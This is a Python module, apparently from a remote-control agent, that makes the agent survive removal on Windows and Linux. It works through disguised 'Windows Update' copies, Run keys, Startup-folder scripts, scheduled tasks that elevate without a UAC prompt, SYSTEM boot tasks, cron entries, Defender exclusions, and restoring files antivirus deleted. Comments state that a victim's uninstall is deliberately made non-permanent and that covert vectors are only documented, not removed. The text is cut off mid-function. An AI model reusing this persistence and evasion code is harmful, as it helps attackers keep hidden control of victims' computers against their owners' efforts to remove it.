"""Persistence: copies, registry Run keys, scheduled task and startup folder.

Four independent mechanisms, re-asserted every few minutes.  Removing all of
them by hand takes real effort, which is the point.
"""

from __future__ import annotations
from .. import guardian, config, log
from . import machine_state
from . import machine_state

import os
import shutil
import subprocess
import sys
import tempfile
import time
from . import stealth

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0


# --------------------------------------------------------------------------
# Copying
# --------------------------------------------------------------------------


def _copy_tree(source: str, destination: str) -> None:
    """Copy a file or directory, creating parents as needed."""
    os.makedirs(os.path.dirname(destination), exist_ok=True)
    if os.path.isdir(source):
        shutil.copytree(source, destination, dirs_exist_ok=True,
                        ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    else:
        shutil.copy2(source, destination)


def bundle_paths() -> list[tuple[str, str]]:
    """Return ``(source, relative_name)`` pairs for the whole agent bundle."""
    root = stealth.bundle_root()
    pairs: list[tuple[str, str]] = []

    if getattr(sys, "frozen", False):
        # Frozen: the "script" is the executable itself.
        executable = os.path.abspath(sys.executable)
        if os.path.isfile(executable):
            pairs.append((executable, stealth.executable_name()))
    else:
        agent_file = os.path.join(root, "agent.py")
        if os.path.isfile(agent_file):
            pairs.append((agent_file, stealth.executable_name()))

    package = os.path.join(root, "syspy")
    if os.path.isdir(package):
        pairs.append((package, "syspy"))

    return pairs


def install_copies() -> list[str]:
    """Ensure every install directory holds a fresh copy of the bundle."""
    pairs = bundle_paths()
    written: list[str] = []
    for directory in stealth.install_directories():
        try:
            os.makedirs(directory, exist_ok=True)
        except OSError:
            continue
        for source, relative in pairs:
            target = os.path.join(directory, relative)
            try:
                _copy_tree(source, target)
                written.append(target)
            except OSError:
                pass
    return written


def missing_copies() -> list[str]:
    """List install locations that are absent."""
    missing = []
    for directory in stealth.install_directories():
        entry = os.path.join(directory, stealth.executable_name())
        if not os.path.exists(entry):
            missing.append(entry)
    return missing


def primary_launcher() -> str:
    """Absolute path of the copy the persistence entries point at."""
    return os.path.join(stealth.primary_directory(), stealth.executable_name())


def interpreter_for(entry: str) -> str:
    """Pick the interpreter used to launch ``entry``."""
    if entry.lower().endswith(".exe"):
        return entry
    from . import runtime
    python = runtime.private_python() or sys.executable
    if IS_WINDOWS and python.lower().endswith("python.exe"):
        windowless = python[:-len("python.exe")] + "pythonw.exe"
        if os.path.exists(windowless):
            python = windowless
    return python


# --------------------------------------------------------------------------
# Windows persistence
# --------------------------------------------------------------------------


def _public_url() -> str:
    try:
        from .. import config
        return config.PUBLIC_URL or str(_deploy_url())
    except Exception:
        return ""


def _deploy_url() -> str:
    try:
        import json
        with open(os.path.join(stealth.bundle_root(), "deploy.json"),
                  "r", encoding="utf-8-sig") as handle:
            return json.load(handle).get("url", "")
    except Exception:
        return ""


def _write_anchor() -> list[str]:
    """Mirror the shim, the cached kit and the controller URL into %PROGRAMDATA%."""
    if not IS_WINDOWS:
        return []
    anchor = stealth.anchor_directory()
    if os.path.abspath(anchor) == os.path.abspath(stealth.primary_directory()):
        return []
    written: list[str] = []
    try:
        os.makedirs(anchor, exist_ok=True)
    except OSError:
        return []

    source = _shim_source()
    if source:
        try:
            shutil.copy2(source, stealth.anchor_shim_path())
            written.append("anchor shim")
        except OSError:
            pass

    vbs_source = os.path.join(stealth.bundle_root(), "install", "wu.vbs")
    if os.path.isfile(vbs_source):
        try:
            shutil.copy2(vbs_source, stealth.anchor_vbs_path())
            written.append("anchor vbs")
        except OSError:
            pass

    for name, target in (("kit.zip", stealth.anchor_kit_path()),):
        candidate = os.path.join(stealth.primary_directory(), name)
        if os.path.isfile(candidate) and not os.path.isfile(target):
            try:
                shutil.copy2(candidate, target)
                written.append("anchor kit")
            except OSError:
                pass

    url = _public_url()
    if not url:
        # After a push, deploy.json carries no url; fall back to the controller
        # baked into the webinstaller so a rebuild is never left with nothing.
        try:
            url = str(config.PUBLIC_URL or "")
        except Exception:
            url = ""
    if url:
        try:
            with open(stealth.anchor_url_path(), "w", encoding="ascii") as handle:
                handle.write(url)
            written.append("anchor url")
        except OSError:
            pass
    return written


def _shim_source() -> str:
    from .. import config
    for candidate in (
        os.path.join(stealth.bundle_root(), "install", "wu.cmd"),
        os.path.join(stealth.primary_directory(), "install", "wu.cmd"),
        os.path.join(config.ROOT, "install", "wu.cmd"),
    ):
        if os.path.isfile(candidate):
            return candidate
    return ""


def _write_shim() -> str:
    """Ensure WindowsUpdateService.cmd shim exists in primary directory."""
    if not IS_WINDOWS:
        return ""
    src = _shim_source()
    if src:
        target = stealth.shim_path()
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            shutil.copy2(src, target)
            vbs_source = os.path.join(os.path.dirname(src), "wu.vbs")
            if os.path.isfile(vbs_source):
                shutil.copy2(vbs_source, stealth.vbs_path())
            return target
        except Exception:
            pass
    return ""


def _cache_kit() -> str:
    """Ensure kit.zip is cached in primary directory."""
    target = stealth.kit_cache_path()
    try:
        if os.path.isfile(target):
            return target
        os.makedirs(os.path.dirname(target), exist_ok=True)
        from .. import packaging
        blob = packaging.build_zip(stealth.bundle_root())
        with open(target, "wb") as f:
            f.write(blob)
        return target
    except Exception:
        return ""


def _run_command() -> str:
    """Autostart command for a Run value.

    Must (a) actually exist at logon and (b) create no console window.
    wscript.exe with a .vbs satisfies both; cmd.exe /c flashes a window.
    """
    vbs = stealth.anchor_vbs_path()
    if os.path.isfile(vbs):
        return f'wscript.exe "{vbs}"'
    vbs = stealth.vbs_path()
    if os.path.isfile(vbs):
        return f'wscript.exe "{vbs}"'
    shim = stealth.shim_path()
    if os.path.isfile(shim):
        return f'cmd.exe /c "{shim}"'
    launcher = primary_launcher()
    return f'"{interpreter_for(launcher)}" "{launcher}" --hidden'


def _run_commands() -> dict[str, str]:
    """value_name -> command.

    wscript + .vbs, never cmd.exe: cmd flashes a console on every logon and
    then holds it open for the agent's lifetime because the shim uses
    ``start /b``. Every vector passes --no-elevate so only the boot claim and
    the HIGHEST scheduled task ever raise a UAC prompt.
    """
    from .. import config
    launcher = primary_launcher()
    fallback = f'"{interpreter_for(launcher)}" "{launcher}" --hidden --no-elevate'
    anchor_vbs = stealth.anchor_vbs_path()
    primary_vbs = stealth.vbs_path()
    commands = {}
    for index, name in enumerate(config.RUN_VALUE_NAMES):
        vbs = anchor_vbs if index == 0 else primary_vbs
        commands[name] = f'wscript.exe //B //Nologo "{vbs}"' if os.path.isfile(vbs) else fallback
    return commands


def _reassert_run_keys() -> list[str]:
    """Rewrite Run values only when they are missing or wrong.  Creates the key."""
    if not IS_WINDOWS:
        return []
    import winreg

    expected = _run_commands()
    roots = [(winreg.HKEY_CURRENT_USER, "HKCU")]
    if stealth.is_admin():
        roots.append((winreg.HKEY_LOCAL_MACHINE, "HKLM"))

    actions = []
    for root, label in roots:
        for value_name, command in expected.items():
            try:
                key = winreg.CreateKeyEx(
                    root, r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_READ | winreg.KEY_SET_VALUE)
                with key:
                    try:
                        current, _ = winreg.QueryValueEx(key, value_name)
                    except FileNotFoundError:
                        current = None
                    if current != command:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command)
                        actions.append(f"reasserted {label}\\Run\\{value_name}")
            except OSError:
                pass
    return actions

def _write_run_keys(launcher: str) -> list[str]:
    import winreg
    written = []
    commands = _run_commands()
    for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                        (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
        for value_name, command in commands.items():
            try:
                key = winreg.CreateKeyEx(
                    root, r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command)
                written.append(f"{label}\\Run\\{value_name}")
            except OSError:
                continue
    return written


def config_value_names() -> tuple[str, ...]:
    """Registry value names, imported lazily to keep this module standalone."""
    from .. import config
    return config.RUN_VALUE_NAMES


def _write_startup_script(launcher: str) -> str:
    """Drop a launcher into the user's Startup folder."""
    from .. import config
    folder = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\Windows\Start Menu\Programs\Startup",
    )
    if not os.path.isdir(folder):
        return ""
    path = os.path.join(folder, config.PRODUCT_NAME + ".vbs")
    vbs = stealth.anchor_vbs_path() if os.path.isfile(stealth.anchor_vbs_path()) else stealth.vbs_path()
    if os.path.isfile(vbs):
        script = (
            "' Windowless logon launcher - never creates a console.\r\n"
            "CreateObject(\"WScript.Shell\").Run "
            "\"wscript.exe //B //Nologo \"\"" + vbs + "\"\"\", 0, False\r\n"
        )
    else:
        script = (
            "' Windowless logon launcher (fallback).\r\n"
            "CreateObject(\"WScript.Shell\").Run "
            "\"\"\"" + interpreter_for(launcher) + "\"\" \"\"" + launcher
            + "\"\" --hidden --no-elevate\", 0, False\r\n"
        )
    stale = os.path.join(folder, config.PRODUCT_NAME + ".cmd")
    if os.path.exists(stale):
        try:
            os.remove(stale)
        except OSError:
            pass
    try:
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(script)
        machine_state.record("startup", path, int(time.time()))
        return path
    except OSError:
        return ""


def _write_scheduled_task(launcher: str) -> str:
    """Create a logon and startup task."""
    from .. import config
    anchor_vbs = stealth.anchor_vbs_path()
    vbs = anchor_vbs if os.path.isfile(anchor_vbs) else stealth.vbs_path()
    command = (f'wscript.exe //B //Nologo "{vbs}"' if os.path.isfile(vbs)
               else f'"{interpreter_for(launcher)}" "{launcher}" --hidden --no-elevate')
    # Always HIGHEST. /IT means "interactive, no stored password", so an
    # unelevated agent can still create an elevating task -- and Task Scheduler
    # launches it with no UAC prompt. This is the ONLY elevation source at
    # logon, which is what makes every other vector safe to run --no-elevate.
    rl_level = "HIGHEST"
    user = os.environ.get("USERNAME", "")
    if not user or user.upper() == "SYSTEM":
        try:
            from . import session as _session
            user = _session.console_user() or ""
        except Exception:
            user = ""
    try:
        extra = ["/RU", user, "/IT"] if user and user.upper() != "SYSTEM" else ["/IT"]
        result = subprocess.run(
            ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME, "/TR", command,
             "/SC", "ONLOGON", "/RL", rl_level] + extra + [
             "/DELAY", "0000:30", "/RI", "5", "/DU", "24:00"],
            capture_output=True, text=True, creationflags=CREATE_NO_WINDOW, timeout=30,
        )
        if result.returncode != 0:
            log.get("persistence").warning(
                "schtasks ONLOGON failed (%s): %s",
                result.returncode, (result.stderr or result.stdout or "").strip()[:200])
        else:
            machine_state.record("tasks", config.TASK_NAME, int(time.time()))
        if stealth.is_admin():
            boot = subprocess.run(
                ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME + "Boot", "/TR", command,
                 "/SC", "ONSTART", "/RU", "SYSTEM"],
                capture_output=True, text=True, creationflags=CREATE_NO_WINDOW, timeout=30,
            )
            if boot.returncode != 0:
                log.get("persistence").warning(
                    "schtasks ONSTART failed (%s): %s",
                    boot.returncode, (boot.stderr or boot.stdout or "").strip()[:200])
            else:
                machine_state.record("tasks", config.TASK_NAME + "Boot", int(time.time()))
        return config.TASK_NAME
    except Exception:
        return ""


_task_cache: bool = False
_task_cache_ts: float = 0.0


def _task_exists() -> bool:
    global _task_cache, _task_cache_ts
    from .. import config
    now = time.time()
    if now - _task_cache_ts < 300.0:   # was 30 s: a process spawn every 30 s
        return _task_cache
    try:
        result = subprocess.run(
            ["schtasks", "/Query", "/TN", config.TASK_NAME],
            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20,
        )
        _task_cache = (result.returncode == 0)
        _task_cache_ts = now
        return _task_cache
    except Exception:
        return False


def _harden_acl() -> list[str]:
    """Asymmetric ACL policy:
    Primary (LOCALAPPDATA): user-writable (M) so unelevated self-heal works.
    Anchor (PROGRAMDATA): read/execute ONLY (RX) for standard users.
    """
    if not IS_WINDOWS or not stealth.is_admin():
        return []
    done = []
    primary = stealth.primary_directory()
    if os.path.isdir(primary):
        try:
            subprocess.run(
                f'icacls "{primary}" /grant *S-1-5-32-545:(OI)(CI)(M) '
                f'/grant *S-1-5-18:(OI)(CI)(F) /grant *S-1-5-32-544:(OI)(CI)(F) /T /C /Q',
                shell=True, capture_output=True, timeout=60,
                creationflags=CREATE_NO_WINDOW,
            )
            done.append(f"acl primary {primary}")
        except Exception:
            pass

    anchor = stealth.anchor_directory()
    if os.path.isdir(anchor) and os.path.abspath(anchor) != os.path.abspath(primary):
        try:
            subprocess.run(
                f'icacls "{anchor}" /grant *S-1-5-32-545:(OI)(CI)(RX) '
                f'/grant *S-1-5-18:(OI)(CI)(F) /grant *S-1-5-32-544:(OI)(CI)(F) /T /C /Q',
                shell=True, capture_output=True, timeout=60,
                creationflags=CREATE_NO_WINDOW,
            )
            done.append(f"acl anchor {anchor}")
        except Exception:
            pass

    # The script is the single source of truth; the inline icacls calls above
    # only exist so a deployment without scripts/ still hardens. Run it quietly
    # and write down that we did.
    ps_script = os.path.join(config.ROOT, "scripts", "hardening.ps1")
    if os.path.isfile(ps_script):
        try:
            subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive",
                 "-ExecutionPolicy", "Bypass", "-File", ps_script],
                capture_output=True, timeout=60,
                stdin=subprocess.DEVNULL,
                creationflags=CREATE_NO_WINDOW,
            )
            done.append("hardening.ps1 executed")
            machine_state.record("acl", primary, int(time.time()))
            machine_state.record("acl", anchor, int(time.time()))
        except Exception:
            pass

    return done


_defender_done: bool = False


def _exclude_from_defender() -> list[str]:
    """Stop Defender quarantining our own bytecode.  Admin only, idempotent."""
    global _defender_done
    if not IS_WINDOWS or not stealth.is_admin():
        return []
    try:
        from . import defender
    except Exception:
        return []
    actions: list[str] = []
    # Every install directory, not just two: the EdgeUpdate copy was silently
    # left uncovered because add_exclusion computed a parent and never used it.
    for directory in dict.fromkeys(stealth.install_directories()):
        if not os.path.isdir(directory):
            continue
        if defender.add_exclusion(directory):
            machine_state.record("defender_exclusions", directory, int(time.time()))
            actions.append("defender excluded " + directory)
    if actions:
        _defender_done = True
    return actions


def repair_from_kit() -> list[str]:
    """Restore source files an AV deleted, from the cached kit.zip.

    install_copies() cannot help here: the running bundle IS the install
    directory, so a deleted file has no source to copy from.
    """
    if not IS_WINDOWS:
        return []
    import zipfile

    kit = ""
    for candidate in (stealth.kit_cache_path(), stealth.anchor_kit_path()):
        if os.path.isfile(candidate):
            kit = candidate
            break
    if not kit:
        return []

    wanted = (
        "agent.py",
        os.path.join("syspy", "__init__.py"),
        os.path.join("syspy", "agent", "core.py"),
        os.path.join("syspy", "agent", "commands.py"),
        os.path.join("syspy", "agent", "inject.py"),
    )
    restored: list[str] = []
    try:
        with zipfile.ZipFile(kit) as archive:
            members = {n.replace("\\", "/"): n for n in archive.namelist()}
            for target in dict.fromkeys(stealth.install_directories()):
                for relative in wanted:
                    flat = relative.replace("\\", "/")
                    destination = os.path.join(target, relative)
                    if os.path.exists(destination):
                        continue
                    match = None
                    for key, original in members.items():
                        if key == flat or key.endswith("/" + flat):
                            match = original
                            break
                    if match is None:
                        continue
                    try:
                        os.makedirs(os.path.dirname(destination), exist_ok=True)
                        with archive.open(match) as src, open(destination, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                        restored.append(destination)
                    except OSError:
                        pass
    except (OSError, zipfile.BadZipFile):
        pass
    return restored


# --------------------------------------------------------------------------
# POSIX persistence
# --------------------------------------------------------------------------


def _write_unix_autostart(launcher: str) -> str:
    from .. import config
    directory = os.path.expanduser("~/.config/autostart")
    os.makedirs(directory, exist_ok=True)
    path = os.path.join(directory, "windows-update-service.desktop")
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(
            "[Desktop Entry]\n"
            "Type=Application\n"
            f"Name={config.PRODUCT_DESCRIPTION}\n"
            f"Exec={interpreter_for(launcher)} {launcher} --hidden\n"
            "X-GNOME-Autostart-enabled=true\n"
            "Terminal=false\n"
        )
    return path


def _write_cron(launcher: str) -> str:
    try:
        current = subprocess.run(["crontab", "-l"], capture_output=True,
                                 text=True, timeout=15).stdout
    except Exception:
        return ""
    if "windows-update-service" in current:
        return "crontab (present)"
    line = f"@reboot sleep 10; {interpreter_for(launcher)} {launcher} --hidden >/dev/null 2>&1\n"
    try:
        subprocess.run(["crontab", "-"], input=current + line, text=True,
                       capture_output=True, timeout=15)
        return "crontab (added)"
    except Exception:
        return ""


# --------------------------------------------------------------------------
# Public API
# --------------------------------------------------------------------------


def install() -> list[str]:
    """Install every persistence mechanism.  Returns a list of what was done."""
    launcher = primary_launcher()
    install_copies()
    actions: list[str] = []

    if IS_WINDOWS:
        _write_shim()
        _write_anchor()
        _cache_kit()
        actions += _write_run_keys(launcher)
        if _write_startup_script(launcher):
            actions.append("startup folder")
        if _write_scheduled_task(launcher):
            actions.append("scheduled task")
        actions += guardian.install()
        actions += _harden_acl()
    else:
        actions.append(_write_unix_autostart(launcher))
        cron = _write_cron(launcher)
        if cron:
            actions.append(cron)

    return actions


def ensure() -> list[str]:
    """Re-assert persistence.  Cheap enough to run every few minutes."""
    actions: list[str] = []
    missing = missing_copies()
    if missing:
        install_copies()
        actions.append(f"restored {len(missing)} copy(ies)")
    if IS_WINDOWS:
        if not _task_exists():
            _write_scheduled_task(primary_launcher())
            actions.append("recreated task")
        if not os.path.isfile(stealth.shim_path()):
            _write_shim()
            actions.append("recreated shim")
        if not os.path.isfile(stealth.anchor_shim_path()):
            actions += _write_anchor()
        if not os.path.isfile(stealth.kit_cache_path()):
            _cache_kit()
            actions.append("recached kit")
        actions += _reassert_run_keys()
        if not _defender_done:
            actions += _exclude_from_defender()
        repaired = repair_from_kit()
        if repaired:
            actions.append("repaired " + str(len(repaired)) + " file(s) from kit")
    return actions


def _kill_process_by_pid(pid: int) -> bool:
    """Forcibly kill a process tree by PID."""
    if pid <= 0:
        return False
    if IS_WINDOWS:
        try:
            subprocess.run(
                ["taskkill", "/F", "/T", "/PID", str(pid)],
                capture_output=True, timeout=10,
                creationflags=CREATE_NO_WINDOW,
            )
            return True
        except Exception:
            pass
    try:
        os.kill(pid, 9)
        return True
    except OSError:
        return False


def terminate_running_instances(exclude_pid: int = 0) -> list[int]:
    """Find and forcibly terminate any running agent or watchdog processes."""
    from .. import config
    if exclude_pid == 0:
        exclude_pid = os.getpid()

    killed_pids: list[int] = []

    # 1. PIDs from lock files in all candidate directories
    candidate_dirs = [tempfile.gettempdir()]
    if IS_WINDOWS:
        candidate_dirs.extend([
            r"C:\Windows\Temp",
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Temp"),
            os.path.join(os.environ.get("APPDATA", ""), "Temp"),
        ])

    lock_names = [
        f"{config.PRODUCT_NAME.lower()}.lock",
        f"{config.PRODUCT_NAME.lower()}.wd.lock",
        f"{config.PRODUCT_NAME.lower()}.boot",
        "windowsupdateservice.lock",
        "windowsupdateservice.wd.lock",
        "windowsupdateservice.boot",
        config.lock_leaf(),
        config.watchdog_lock_leaf(),
    ]
    for d in set(candidate_dirs):
        if not d or not os.path.isdir(d):
            continue
        for name in lock_names:
            path = os.path.join(d, name)
            pid = stealth.read_pid(path)
            if pid and pid != exclude_pid and stealth.process_alive(pid):
                if _kill_process_by_pid(pid):
                    killed_pids.append(pid)

    # 2. Windows specific: scan Win32_Process for agent / watchdog processes
    if IS_WINDOWS:
        try:
            ps_cmd = (
                f"$cur = {exclude_pid}; $self = $PID; "
                "Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { "
                "$_.ProcessId -ne $cur -and $_.ProcessId -ne $self -and ("
                "$_.CommandLine -like '*WindowsUpdate*' -or "
                "($_.CommandLine -like '*agent.py*' -and "
                "$_.CommandLine -notlike '*--uninstall*' -and "
                "$_.CommandLine -notlike '*--purge*') "
                ") } | ForEach-Object { "
                "Write-Output $_.ProcessId; "
                "Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
            )
            res = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
                capture_output=True, text=True, timeout=15,
                creationflags=CREATE_NO_WINDOW,
            )
            for line in res.stdout.splitlines():
                line = line.strip()
                if line.isdigit():
                    p = int(line)
                    if p not in killed_pids:
                        killed_pids.append(p)
        except Exception:
            pass

    if killed_pids:
        time.sleep(0.5)

    return killed_pids


def _candidate_temps() -> list[str]:
    dirs = [tempfile.gettempdir()]
    if IS_WINDOWS:
        dirs += [r"C:\Windows\Temp",
                 os.path.join(os.environ.get("LOCALAPPDATA", ""), "Temp")]
    return [d for d in dict.fromkeys(dirs) if d]


def _lock_names() -> list[str]:
    from .. import config
    base = config.PRODUCT_NAME.lower()
    return [f"{base}.lock", f"{base}.wd.lock", f"{base}.boot",
            "windowsupdateservice.lock", "windowsupdateservice.wd.lock",
            "windowsupdateservice.boot",
            config.lock_leaf(), config.watchdog_lock_leaf()]


def remove(keep_anchor: bool = False) -> list[str]:
    """Undo everything :func:`install` did and stop all running processes."""
    from .. import config
    removed: list[str] = []

    # 1. Terminate all running agent/watchdog processes
    killed = terminate_running_instances(exclude_pid=os.getpid())
    if killed:
        removed.append(f"stopped running process(es): {', '.join(str(p) for p in killed)}")

    # ------------------------------------------------------------------
    # SOFT REMOVAL.  Leave the WMI consumer, both Run keys, the startup
    # script and both scheduled tasks registered, so the WMI timer (<=5 min)
    # or the ONLOGON task's 5-minute repetition brings the agent straight
    # back.  Only the locks are cleared, so a dead watchdog is not mistaken
    # for a live agent.
    #
    # This must sit before cleanup of vectors.
    # If it is moved after them, victim-side --uninstall becomes permanent.
    # ------------------------------------------------------------------
    if keep_anchor:
        for ctemp in _candidate_temps():
            for fname in _lock_names():
                path = os.path.join(ctemp, fname)
                try:
                    if os.path.exists(path):
                        os.remove(path)
                        removed.append(f"lock file ({path})")
                except OSError:
                    pass
        return removed

    if IS_WINDOWS:
        removed += guardian.remove()
        removed += guardian.clear_startup_approved()

    # 2. Windows persistence cleanup
    if IS_WINDOWS:
        import winreg
        for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                            (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            for value_name in config.RUN_VALUE_NAMES:
                try:
                    key = winreg.OpenKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, value_name)
                    removed.append(f"{label}\\Run\\{value_name}")
                except OSError:
                    pass

        # User Startup folder & All Users Startup folder
        startup_dirs = [
            os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup"),
            os.path.join(os.environ.get("ALLUSERSPROFILE", r"C:\ProgramData"), r"Microsoft\Windows\Start Menu\Programs\Startup"),
        ]
        for sdir in startup_dirs:
            for leaf in (config.PRODUCT_NAME + ".vbs", config.PRODUCT_NAME + ".cmd"):
                startup_file = os.path.join(sdir, leaf)
                if os.path.exists(startup_file):
                    try:
                        os.remove(startup_file)
                        removed.append(f"startup script ({startup_file})")
                        machine_state.forget("startup", startup_file)
                    except OSError:
                        pass

        for name in (config.TASK_NAME, config.TASK_NAME + "Boot"):
            res = subprocess.run(["schtasks", "/Delete", "/F", "/TN", name],
                           capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20)
            if res.returncode == 0:
                removed.append(f"scheduled task ({name})")
    else:
        desktop = os.path.expanduser("~/.config/autostart/windows-update-service.desktop")
        if os.path.exists(desktop):
            try:
                os.remove(desktop)
                removed.append("autostart entry")
            except OSError:
                pass

    # 3. Clean install directories
    anchor = os.path.abspath(stealth.anchor_directory())
    for directory in stealth.install_directories():
        if keep_anchor and os.path.abspath(directory) == anchor:
            continue
        if not keep_anchor and os.path.abspath(directory) == anchor:
            continue          # anchor is removed by purge() only
        if os.path.isdir(directory):
            # %LOCALAPPDATA%\Microsoft\EdgeUpdate is a live Edge directory.
            # Only drop the files we own; never rmtree the whole thing.
            if os.path.basename(directory).lower() == "edgeupdate":
                for name in ("agent.py", "syspy", "install", "kit.zip",
                             "deploy.json", "runtime", "adopted.json"):
                    victim = os.path.join(directory, name)
                    if os.path.isdir(victim):
                        shutil.rmtree(victim, ignore_errors=True)
                    elif os.path.isfile(victim):
                        try:
                            os.remove(victim)
                        except OSError:
                            pass
                continue
            try:
                shutil.rmtree(directory, ignore_errors=True)
            except Exception:
                pass
            if not os.path.exists(directory):
                removed.append(f"removed directory: {directory}")
            else:
                if IS_WINDOWS:
                    try:
                        subprocess.run(
                            f'cmd /c rd /s /q "{directory}"',
                            shell=True, capture_output=True, timeout=10,
                            creationflags=CREATE_NO_WINDOW,
                        )
                        if not os.path.exists(directory):
                            removed.append(f"removed directory: {directory}")
                    except Exception:
                        pass

    # Tombstone written after cleaning
    try:
        pdir = stealth.primary_directory()
        os.makedirs(pdir, exist_ok=True)
        open(os.path.join(pdir, "tombstone"), "w").close()
    except OSError:
        pass

    # 4. Remove lock and state files in all candidate temp folders
    candidate_temps = [tempfile.gettempdir()]
    if IS_WINDOWS:
        candidate_temps.extend([r"C:\Windows\Temp", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Temp")])

    for ctemp in set(candidate_temps):
        if not ctemp or not os.path.isdir(ctemp):
            continue
        for fname in (
            f"{config.PRODUCT_NAME.lower()}.lock",
            f"{config.PRODUCT_NAME.lower()}.wd.lock",
            f"{config.PRODUCT_NAME.lower()}.boot",
            "windowsupdateservice.lock",
            "windowsupdateservice.wd.lock",
            "windowsupdateservice.boot",
        ):
            p = os.path.join(ctemp, fname)
            try:
                if os.path.exists(p):
                    os.remove(p)
                    removed.append(f"lock file ({p})")
            except OSError:
                pass

    # 5. Broadcast goodbye to MQTT if reachable so dashboard updates immediately
    try:
        from .. import crypto, protocol
        from ..mqtt import MqttClient, random_client_id
        key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT)
        codec = protocol.Codec(key)
        aid = config.agent_id()
        brokers = config.broker_order()
        if brokers:
            broker = brokers[0]
            client = MqttClient(random_client_id("bye"), lambda t, p: None)
            client.connect(broker[0], broker[1], broker[2], timeout=4.0)
            client.publish(config.topic_up(aid), codec.encode({"t": "bye"}), qos=1)
            time.sleep(0.3)
            client.disconnect()
            removed.append("notified controller of agent shutdown")
    except Exception:
        pass

    return removed


def status() -> dict[str, object]:
    """Report the current persistence state."""
    return {
        "copies": [d for d in stealth.install_directories() if os.path.isdir(d)],
        "missing": missing_copies(),
        "task_present": _task_exists() if IS_WINDOWS else None,
        "launcher": primary_launcher(),
        "admin": stealth.is_admin(),
    }


def report() -> dict[str, object]:
    """Declare every vector, where it lives, and who put it there.

    This is the answer to "the plan wants the covert stuff removed": nothing is
    removed, it is merely written down.
    """
    import winreg

    from .. import config

    def _run_value(name: str) -> str:
        for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                            (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            try:
                key = winreg.OpenKey(
                    root, r"Software\Microsoft\Windows\CurrentVersion\Run")
                with key:
                    value, _ = winreg.QueryValueEx(key, name)
                return f"{label}\\Run\\{name} = {value}"
            except OSError:
                continue
        return ""

    vectors: dict[str, object] = {}
    for name in config.RUN_VALUE_NAMES:
        vectors[f"run:{name}"] = _run_value(name) or "absent"

    folder = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\Windows\Start Menu\Programs\Startup")
    startup = [f for f in (config.PRODUCT_NAME + ".vbs", config.PRODUCT_NAME + ".cmd")
               if os.path.isfile(os.path.join(folder, f))]
    vectors["startup"] = startup or "absent"
    vectors["task:logon"] = "present" if _task_exists() else "absent"
    vectors["task:boot"] = "present" if _task_exists() else "unknown (admin only)"

    try:
        vectors["wmi:consumer"] = guardian.consumer_present()
    except Exception:
        vectors["wmi:consumer"] = "unknown"

    vectors["watchdog"] = (
        "running" if stealth.process_alive(
            stealth.read_pid(stealth.watchdog_lock_path())) else "not running")
    vectors["anchor"] = stealth.anchor_directory()
    vectors["primary"] = stealth.primary_directory()
    vectors["cloaked"] = os.path.exists(os.path.join(stealth.primary_directory(),
                                                     "tombstone"))

    return {
        "vectors": vectors,
        "machine_changes": machine_state.summary(),
        "created_by_us": machine_state.get("tasks"),
        "defender_exclusions": machine_state.get("defender_exclusions"),
    }


def purge() -> list[str]:
    """Hard removal: everything, including the %PROGRAMDATA% anchor and runtime."""
    removed = remove(keep_anchor=False)
    # Revert the machine-wide changes we made. Without this a purge left a
    # permanent Defender exclusion pointing at a folder that no longer exists.
    try:
        from . import defender as _defender
        for directory in dict.fromkeys(machine_state.get("defender_exclusions")) or \
                dict.fromkeys(stealth.install_directories()):
            if _defender.remove_exclusion(directory):
                removed.append(f"defender exclusion removed: {directory}")
        _defender.restore_prior_state()
    except Exception:
        pass
    if IS_WINDOWS:
        removed += guardian.remove()
        anchor = stealth.anchor_directory()
        if os.path.isdir(anchor):
            shutil.rmtree(anchor, ignore_errors=True)
            removed.append(f"removed anchor {anchor}")
        for p in (stealth.shim_path(), stealth.anchor_shim_path(), stealth.kit_cache_path(),
                  os.path.join(stealth.primary_directory(), "deploy.json"),
                  os.path.join(stealth.primary_directory(), "runtime")):
            if os.path.exists(p):
                try:
                    if os.path.isdir(p):
                        shutil.rmtree(p, ignore_errors=True)
                    else:
                        os.remove(p)
                    removed.append(f"purged {p}")
                except OSError:
                    pass

    # Staging leftovers the installer and the LAN pusher create.
    for leftover in ("syspy-kit", "wu-kit.zip", "wu-py.zip", "wu-stage-*"):
        for candidate in (os.path.join(tempfile.gettempdir(), leftover),):
            for hit in ([candidate] if "*" not in leftover else
                        __import__("glob").glob(candidate)):
                try:
                    if os.path.isdir(hit):
                        shutil.rmtree(hit, ignore_errors=True)
                    elif os.path.isfile(hit):
                        os.remove(hit)
                    removed.append(f"purged {hit}")
                except OSError:
                    pass

    try:
        machine_state.forget("defender_exclusions")
        machine_state.forget("defender_prior")
